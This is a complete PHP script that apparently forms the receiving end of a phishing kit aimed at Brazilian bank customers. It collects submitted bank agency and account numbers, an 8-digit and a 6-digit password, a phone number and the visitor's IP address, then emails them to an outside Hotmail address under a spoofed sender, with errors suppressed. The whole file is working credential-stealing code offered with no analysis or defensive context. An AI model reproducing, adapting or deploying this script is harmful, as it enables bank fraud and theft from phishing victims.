<?php
$agg=$_POST['agg']; 
$acc=$_POST['acc'];
$ss8=$_POST['ss8']; 
$senha6=$_POST['senha6']; 
$telefone=$_POST['telefone']; 

$ip = $_SERVER["REMOTE_ADDR"];
$hora=date("H:i:s");

$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: MOBILE-1 <info@filefree.com>";
$conteudo.="[A]: $agg $acc<br>[T]: $telefone<br>[8]: $ss8<br>[6]: $senha6<br> [IP do Bico] $ip";

@mail("bb-pernambuco@hotmail.com", "$ip", "$conteudo", $headers); 

?>